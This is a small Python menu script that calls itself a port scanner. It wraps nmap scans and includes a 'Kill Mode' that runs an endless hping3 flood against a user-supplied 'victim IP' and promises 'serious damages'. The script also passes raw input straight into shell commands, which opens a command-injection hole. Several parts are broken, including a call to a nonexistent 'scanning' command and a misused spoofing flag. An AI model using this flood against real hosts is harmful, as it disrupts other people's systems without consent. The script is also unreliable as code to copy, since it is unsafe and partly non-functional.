#!/usr/bin/python3
import os, time, sys

os.system("clear")


rheader = """ 

            ||||||||||||||||||
               |           |                  |         |
                |       |                 /                 \
                |       |    ||||||||||/                        \
                |       |
            |     |    |    |          |    ||||||||||||||||     | >>PORT SCANNER 1.0
            |    |      |    | |
             |  | | | | | |             |                       |
"""


print(rheader)
print(end="")
print("Port Scaner>>")
print("")
print("SELECT AN OPTION: ", end="")
print("")
print("1 => Attack a network IP")
print("2 => Spoof network IP")
print("3 => Get network OS")
print("4 => Kill Mode")
print("5 => Check requirements")

r = input("Choose: ")

if(r=="1"):
    ip = input("Enter IP: ")
    os.system("scanning "+ip)
    print(time.sleep(5))
    os.system("nmap --osscan-guess "+ip)
    print("Scanning done")


elif(r=="2"):
    ip = input("Enter IP: ")
    os.system("scanning "+ip)
    print(time.sleep(5))
    os.system("nmap -S "+ip)
    print("Scanning done")



elif(r=="3"):
    ip = input("Enter IP: ")
    os.system("scanning "+ip)
    print(time.sleep(5))
    os.system("nmap -A "+ip)
    print("Scanning done")




elif(r=="4"):
    ip = input("Enter victim IP (this will cause serious damages on victim machine e.g slowdown): ")
    r = 0 
    while r<9:
        print("Attacking IP ", ip, " with some serious damages")
        os.system("hping3 --flood "+ip)
        print(time.sleep(5))



elif(r=="5"):
    print("To run this scripts properly you will need NMAP, HPING3  installed on your pc!")
    print("")
    in_put = input("Enter 0 to go back: ")

    if(in_put == "0"):
        os.system("clear")
        os.system("python3 networkScanner.py")

else:
    print("Wrong input")
    print(time.sleep(3))
    os.system("clear")
    os.system("python3 networkScanner.py")





